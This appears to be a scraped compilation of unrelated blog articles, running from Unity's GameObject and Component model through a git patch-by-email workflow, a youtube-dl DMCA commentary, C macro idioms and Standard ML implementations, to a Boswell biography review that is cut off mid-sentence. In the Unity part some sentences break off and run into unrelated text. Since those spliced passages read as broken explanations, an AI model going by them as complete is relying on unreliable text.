there are no more references to it.</p><p>Because your valid reference to a <code>UnityEngine.Object</code> can point to a destroyed
native object, <code>UnityEngine.Object</code> overrides C#‘s <code>operator==</code> and <code>operator!=</code>
to make a destroyed Object <em>appear</em> null. Simply accessing methods on a
destroyed object will return <code>NullReferenceException</code>, albeit with a friendlier
error message that tells you which object you were trying to access.</p><h2 id="gameobject">GameObject</h2><p>A <strong>GameObject</strong> derives from Object and represents anything in your scene.</p><p>Let’s start at a high-level: A GameObject inherits a name and instance ID from
its parent. Otherwise, conceptually, a GameObject</p><ul><li>has a list of <a href="#component"><strong>Components</strong></a> on it,</li><li>has a <code>tag</code> string for organizational purposes, and</li><li>belongs to a <a href="https://docs.unity3d.com/Manual/Layers.html">layer</a>.</li></ul><p>A GameObject’s state</p><ul><li>is the product of all of its <em>Components’</em> state, and</li><li>whether an object is active or not.</li></ul><p>Let’s dig a bit deeper. When starting, most of the interesting stuff in a
GameObject is in its <strong>Components</strong>. A GameObject has at least one Component:
its <a href="https://docs.unity3d.com/ScriptReference/Transform.html"><code>Transform</code></a>. A
Transform describes the position and rotation of the GameObject. A Transform
includes helper properties that show an object’s <em>absolute world</em> position and
rotation, as well as the position and rotation <em>relative</em> to its parent. In the
Editor, the Transform position and rotation are set from the <em>parent relative</em>
variants.</p><p>Since every GameObject has a Transform (and also, given that a Transform is
frequently needed/accessed), the GameObject directly exposes a
<code>Transform transform</code> public property.</p><p>You can access individual components from <code>T GetComponent&lt;T&gt;()</code>, or lists of
components from <code>T[] GetComponents&lt;T&gt;()</code>, etc. These methods search through all
components on a GameObject and return ones with a compatible type (or null, if
none exist in the singular case). Since these methods search through components
and check type compatibility, it is often recommended to cache this lookup.</p><p>If you are building/extending a GameObject by hand, you can always use
<code>T AddComponent&lt;T&gt;()</code>. In most cases, however, you’re better off using the
Editor.</p><p>Individual Objects (a Component or ScriptableObject) might refer to other
<code>GameObjects</code> in a few ways:</p><ul><li><p><strong>By reference</strong>. By exposing a <code>GameObject</code> <em>serialized field</em> that you
then set from the inspector.</p><p><em>We have discussed serialization extensively throughout the series:
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt1-basic-concepts#serialization">as a fundamental concept</a>
and in our tour of the Editor, when
<a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt4-editor-tour#inspector">describing the Inspector</a>,
and the <a href="https://blog.eyas.sh/2020/10/unity-for-engineers-pt2-six-practices">practice</a> of using
the Inspector as an injection framework</em>.</p></li><li><p><strong>Using tags</strong>. Every Game Object can have a <em>tag</em> string. You can find
objects in the scene using that tag through the static functions
<code>GameObject.FindGameObjectsWithTag</code> and <code>GameObject.FindGameObjectWithTag</code>.
A GameObject also exposes a public <code>bool CompareTag(string tag)</code> method.</p><p>This is a quick-and-dirty way to get the job done, but is still a popular
way. A common use of this in the wild is to have a <code>"Player"</code> tag to find
the Player. Ideally, these methods should not be called every frame, so if
you have to use them, consider caching the result.</p></li><li><p><strong>Using layers</strong>. A layer is an <code>int</code> between 0 and 31. Every Game Object is
in exactly one layer.</p><p>While you can’t directly look up all objects in a layer, if you already have
a reference to a GameObject (e.g., in a collision event), you can check a
GameObject against a
<a href="https://docs.unity3d.com/ScriptReference/LayerMask.html"><code>LayerMask</code></a>. A
<code>LayerMask</code> is typically used in functions like <code>Physics.Raycast()</code>. This
allows you to find objects with colliders intersecting with a given <em>ray</em>.
Passing a <code>LayerMask</code> to <code>Physics.Raycast()</code> will only return objects within
the specified set of layers.</p><p>Inside the Unity Engine, <em>Cameras</em> make heavy use of layers. E.g., you can
have one camera that renders “everything but UI”, and overlay another camera
for an in-game HUD, etc.</p></li><li><p><strong>Using indirect references</strong>. There are many reasons why the methods above
might be insufficient: you might not want to use tags to avoid depending on
copy-pasted strings, and layers might not fit your use case. If referencing
a fellow object in-scene is not an option (e.g., you’re dealing with a
dynamic set of objects or don’t have access to the current scene objects in
the context you need this reference, etc.), then you might want to look
further.</p><p>For this, an increasingly popular concept is <em>runtime sets</em> Scriptable
Objects. You can read more about this in Unity’s how-to article on

Hipple. If you have an hour to spare, you might want to watch the whole
thing.</p></li></ul><p>A GameObject also exposes a <code>BroadcastMessage</code> and <code>SendMessage</code> functions that

User-implemented Components will usually extend the <code>MonoBehaviour</code> subclass
(more on that later).</p><p>A Component inherits a name and instance ID from its parent. Otherwise,
conceptually, a Component</p><ul><li>always <em>belongs</em> to a single GameObject, exposed as a public
<code>GameObject gameObject</code> property, and</li><li>can receive <strong>messages</strong>, driving much of its behavior.</li></ul><p>The state of a component on an <em>active</em> GameObject lies entirely in its
implementation.</p><p>In addition to its <code>GameObject</code>, a component exposes shorthand properties and
methods such as <code>Transform transform</code>, <code>T GetComponent&lt;T&gt;()</code>, etc. These are
simply convenience shorthands for accessing those same methods on the
corresponding <code>gameObject</code>.</p><p>The most important functionality of a Component is driven through <strong>Unity
Messages</strong> (also sometimes called <em>Unity Event Functions</em> when referring to
built-in messages). These are effectively callbacks functions triggered <em>by the
Engine</em> in certain situations. Every Component will receive a <code>Awake()</code>,
<code>Start()</code>, <code>Update()</code> and other messages, for example. The Unity Docs on the
<a href="https://docs.unity3d.com/Manual/ExecutionOrder.html">Order of Execution</a> of
these messages is a convenient resource.</p><p>To have your component receive a particular message, simply add a
<em><code>private void</code></em> method with the appropriate message name. The runtime will use
reflection to call these messages, when applicable. This is why you don’t see an
<code>override</code> directive on these messages. Messages like <code>Update</code>, <code>LateUpdate</code>,
and <code>FixedUpdate</code> are inspected once per type, so don’t worry about reflection
being used in every frame. See more details in the
”<a href="https://blogs.unity3d.com/2015/12/23/1k-update-calls/">10000 Update() calls</a>”
Unity blog post for more information.</p><p>A <strong><code>Behaviour</code></strong> is a type of component that <em>can be enabled or disabled</em>. When
a <code>Behaviour</code> is disabled, <code>Start</code>, <code>Update</code>, <code>FixedUpdate</code>, <code>LateUpdate</code>,
<code>OnEnable</code>, and <code>OnDisable</code> messages are not called.</p><p>A <strong><code>MonoBehaviour</code></strong> is a <code>Behaviour</code> that also enables using
<a href="https://docs.unity3d.com/Manual/Coroutines.html">Coroutines</a>.</p><h2>A Note on Inactive Objects and Disabled Components</h2><p>A GameObject in a loaded scene will exist in memory until the object is
<em>Destroyed</em> explicitly or the scene is unloaded. A GameObject can be set to
<em>inactive</em>, which will cause it to stop receiving <code>Update</code> (and related) events.</p><p><strong>When an object is <em>created</em></strong>, the messages called on a component depend on
if: (1) the GameObject is active, and (2) the component is enabled:</p><table><thead><tr><th></th><th>GameObject is <em>active</em></th><th>GameObject is <em>inactive</em></th></tr></thead><tbody><tr><td>Component is Enabled</td><td><code>Awake</code>, <code>OnEnable</code>, <code>Start</code></td><td><em>Component implicitly disabled</em></td></tr><tr><td>Component is Disabled</td><td><code>Awake</code></td><td><code>Awake</code></td></tr></tbody></table><p><strong>When an object is <em>set to active</em> or a <code>Behaviour</code> is <em>set to enabled</em></strong>:</p><ul><li><code>OnEnable</code> will be called.</li><li>If <code>Start</code> has never been called on this <code>Behaviour</code>, it will be called
exactly once.</li></ul><h2 id="takeaways">Takeaways</h2><p>Some takeaways of all this:</p><ol><li>A Unity object might <em>appear to become <code>null</code></em> when destroyed. <code>== null</code>
checking does more than you think.</li><li>As a result, null-coalescing operators (<code>??</code>, <code>??=</code>) and null-conditional
operators (<code>?.</code>, <code>?[]</code>) don’t work as expected.</li><li>Yes, your Unity Messages can be private!</li><li>Don’t create abstract classes that unnecessarily declare <code>Update</code> or other
messages to make overriding easier; that’ll result in the engine always
calling these events.</li><li>Disabling an Object or Component is a great way to limit its game logic or
save on CPU-bound effort, but these objects still have a memory overhead.</li></ol></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span>touch original.txt new.txt</span><br><span><span>echo</span> <span>"New addition"</span> &gt; new.txt</span><br></pre></td></tr></tbody></table></figure>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>diff original.txt new.txt -u &gt; changes.patch</span><br></pre></td></tr></tbody></table></figure>
<figure><figcaption><span>changes.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></pre></td><td><pre><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+New addition</span></span><br></pre></td></tr></tbody></table></figure>
<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>
<figure><figcaption><span>0001-Added-Tarun-Batra-to-contributors.patch</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span>From 619814a3ac21012580e725136864e8397c14e20b Mon Sep 17 00:00:00 2001</span><br><span>From: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date: Tue, 20 Oct 2020 23:15:32 +0200</span><br><span>Subject: [PATCH] Added Tarun Batra to contributors</span><br><span></span><br><span></span><br><span> CONTRIBUTORS.txt | 1 +</span><br><span> 1 file changed, 1 insertion(+)</span><br><span></span><br><span>diff --git a/CONTRIBUTORS.txt b/CONTRIBUTORS.txt</span><br><span>index e69de29..1d12219 100644</span><br><span></span><br><span></span><br><span>@@ -0,0 +1 @@</span><br><span><span>+Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span></span><br><span><span>--</span></span><br><span>2.28.0</span><br></pre></td></tr></tbody></table></figure>
<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>
<figure><figcaption><span>git log</span></figcaption><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span>Author: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br><span>Date:   Tue Oct 20 23:15:32 2020 +0200</span><br><span></span><br><span>    Added Tarun Batra to contributors</span><br><span></span><br><span>    Signed-off-by: Tarun Batra &lt;tarun.batra00@gmail.com&gt;</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

October 25, 2020 | https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/ | <a href="https://web.archive.org/web/*/https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this week, <a href="https://www.zdnet.com/article/riaa-blitz-takes-down-18-github-projects-used-for-downloading-youtube-videos/">GitHub took down the repository</a> for the youtube-dl project. This came in response to a request from the RIAA—the recording industry’s lobbying and harassment body. youtube-dl is a tool for downloading videos. The RIAA argued that this violates the anticircumvention protections of the Digital Millennium Copyright Act (DMCA). While GitHub taking down the repository and its forks is true to the principle of minimizing corporate risk, it’s the wrong choice.</p>



<p> Microsoft—currently the world’s second-most valuable company with a market capitalization of $1.64 trillion—owns GitHub. If anyone is in a position to fight back on this, it’s Microsoft. Microsoft’s lawyers should have a one word answer to the RIAA’s request: “no”. <em>(full disclosure: I own a small number of shares of Microsoft)</em></p>



<h2>The procedural argument</h2>



<p>The first reason to tell the RIAA where to stick it is procedural. The RIAA isn’t arguing that youtube-dl is infringing its copyrights or circumventing its protections. It is arguing that youtube-dl infringes YouTube’s protections. So even if it is, that’s YouTube’s problem, not the RIAA’s.</p>



<h2>The factual argument</h2>



<p>I have some sympathy for the anticircumvention argument. I’m not familiar with the specifics of how youtube-dl works, but it’s at least possible that youtube-dl circumvents YouTube’s copy protection. This would be a reasonable basis for YouTube to take action. Again, YouTube, not the RIAA.</p>



<p>I have less sympathy for the infringement argument. youtube-dl doesn’t induce infringement more than a web browser or screen recorder does. There are a variety of uses for youtube-dl that are not infringing. Foremost is the fact that some YouTube videos are under a license that explicitly allows sharing and remixing. Archivers use it to archive content. Some people who have time-variable Internet billing use it to download videos overnight.</p>



<p>So, yes, youtube-dl can be used to infringe the RIAA’s copyrights. It can also be used for non-infringing purposes. The code itself does not infringe. There’s nothing about it that gives the RIAA a justification to take it down.</p>



<h2>youtube-dl isn’t the whole story</h2>



<p>youtube-dl provides a focal point, but there’s more to it. Copyright law is now used to suppress instead of promote creative works. The DMCA, in particular, favors the large rightsholders over smaller developers and creators. It essentially forces sites to act on a “guilty until proven innocent” model. Companies in a position to push back have an obligation to do so. Microsoft has become a supporter of open source, now it’s time to show they mean it.</p>



<p>We should also consider the risks of consolidation. git is a decentralized system. GitHub has essentially centralized it. Sure, many competitors exist, but GitHub has become the default place to host open source code projects. The fact that GitHub’s code is proprietary is immaterial to this point. A FOSS service would pose the same risk if it became the centralized service.</p>



<p>I saw a quote on this discussion (which I can’t find now) that said “code is free, infrastructure is not.” And while projects self-hosting their code repository, issue tracker, etc may be philosophically appealing, that’s not realistic. Software-as-a-Service has lowered the barrier for starting projects, which is a good thing. But it doesn’t come without risk, which we are now seeing.</p>



<p>I don’t know what the right answer is for this. I know the answer won’t be easy. But both this specific case and the general issues they highlight are important for us to think about.</p>

            <p>This WebGL experiment is an attempt to create a procedural city that feels alive and is fun to watch.</p>
          
            <p>First, we generate a finite grid of random city blocks. Then, using some tricks, the viewpoint wraps around this grid, which creates the illusion of an endless cityscape.</p>

<p>C is a fascinating programming language. For me, it is a particularly beautiful language, because it gives my blog the right to exist.</p>



<p>The C-standard is fine, but it falls short in many respects. It is a very non-committal standard and leaves a lot to the compiler itself. Large compilers such as gcc and clang have clear and useful specifications for this, which means that as a developer you rarely have any problems with this.</p>



<p>However, there are also things that cannot be solved for you by a clever compiler. That is something you really have to think about for yourself. One of those things: macros.</p>



<p>If you regularly work with C, you are used to macros. Especially if you sometimes look at larger C programmes. The larger a program becomes, the more essential a macro can become.</p>



<p>If you are not familiar with macros: this is how they can be used:</p>


<pre title="">#define macro(x)  foo(x); bar(x)
</pre>


<p>The consequence of this macro is that you can do this:</p>


<pre title="">macro(arg);
</pre>


<p>Which results in the following line:</p>


<pre title="">foo(arg); bar(arg);
</pre>


<p>So far, so good. From here on, however, things are only going downhill. Let’s look at another example:</p>


<pre title="">if (test)
    macro(arg);
</pre>


<p>This expands into:</p>


<pre title="">if (test)
    foo(arg);
bar(arg);
</pre>


<p>So now we have a problem. This macro does not behave as you would expect from a function. This is not so strange, because a macro is not a function. All it does is replace text with other text.</p>



<p>We can, of course, place curly braces around our functions to tackle this problem.</p>


<pre title="">#define macro(x)  { foo(x); bar(x); }
</pre>


<p>Now our problem has been solved! Look what is happening with our previous example!</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
</pre>


<p>However, there are also problems to be imagined in this respect. How about this?</p>


<pre title="">if (test)
    macro(arg);
else
    printf("This failed. :(");
</pre>


<p>This will result in the following code block:</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
else
    printf("This failed. :(");
</pre>


<p>Because of the <code>};</code> before <code>else</code>, this is no longer valid code.</p>



<p>So, how do we solve this? We need a way to ensure that everything after the macro identifier is correctly interpreted. Fortunately, there is a way to do that:</p>


<pre title="">#define macro(x) do { foo(x); bar(x); } while(0)
</pre>


<p>If we use this macro now in our previous example, we get:</p>


<pre title="">if (test)
    do {
        foo(arg); bar(arg);
    } while(0);
else
    printf("This failed. :(");
</pre>


<p>And with that we have found a solution.</p>

        <p>Incredibly, Standard ML implementations are still actively
developed. <a href="http://mlton.org/">MLton</a>, <a href="https://polyml.org/">Poly/ML</a>,
<a href="https://elsman.com/mlkit/">MLKit</a>,
<a href="https://www.pllab.riec.tohoku.ac.jp/smlsharp/">SML#</a> and
<a href="http://smlnj-gforge.cs.uchicago.edu/scm/viewvc.php/?root=smlnj">SML/NJ</a>
are the most prominent. Discussion on the future direction of Standard
ML <a href="https://github.com/SMLFamily/Successor-ML/issues">remains healthy as
well</a>.</p>
<p>And somehow OCaml's lesser known cousin still beats out OCaml for
multicore threading support (in Poly/ML).</p>
<p>While MLton hasn't merged with
<a href="https://github.com/kayceesrk/multiMLton">MultiMLton</a> or
<a href="https://github.com/UBMLtonGroup/RTMLton">RTMLton</a> to support
multicore, a <a href="https://github.com/mpllang/mpl">new fork of MLton with
parallelism</a> is pretty far along and
in active development at CMU.</p>
<p>
  A commentor shared
  <a href="https://github.com/ManticoreProject/manticore">Manticore</a>,
  another implementation with parallelism support in active
  development at UChicago.
</p><p>Furthermore, the last few years have welcomed some entirely new
implementations. <a href="https://github.com/KeenS/webml">WebML</a>, by a
prominent open source hacker, is written in Rust and compiles Standard
ML to WebAssembly. <a href="https://sosml.org/">SOSML</a> is an interpreter
written in TypeScript by former students of Saarland University. It
features <a href="https://sosml.org/editor">a nifty online
IDE</a>.</p>
<p>
  A commenter
  shared <a href="https://github.com/SomewhatML/sml-compiler">SomewhatML</a>,
  an actively developing compiler for Standard ML written in Rust.
</p><p>There have also been some new experimental spins on Standard ML in
the last few years. <a href="https://github.com/julianhyde/morel">Morel</a> is an
interpreter with some nice syntax extensions written in Java by the
author of Apache Calcite. And <a href="https://github.com/elpinal/bright-ml">Bright
ML</a> is a spin on Standard ML and
OCaml written in Standard ML (and using the abandoned <a href="https://mosml.org/">Moscow
ML</a> compiler of all implementations).</p>
<p>So if you're looking for an easy intro to the ML family of languages,
I still recommend the simplicity and performance of Standard ML and
its small but definitely, surprisingly, not dead community. :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in 